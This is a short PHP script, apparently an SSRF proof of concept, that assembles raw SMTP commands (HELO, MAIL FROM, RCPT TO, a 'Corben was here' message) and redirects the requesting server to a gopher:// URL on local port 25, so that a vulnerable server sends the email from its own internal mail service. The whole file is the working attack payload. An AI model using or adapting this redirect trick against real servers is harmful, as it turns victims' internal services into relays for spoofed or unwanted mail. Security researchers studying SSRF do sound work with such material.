<?php
        $commands = array(
                'HELO hackertarget.com',
                'MAIL FROM: <maaek@postmarkapp.com >',
                'RCPT To: <gotopo@app-mailer.com>',
                'DATA',
                'Subject: corben!',
                'Corben (cdl) was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
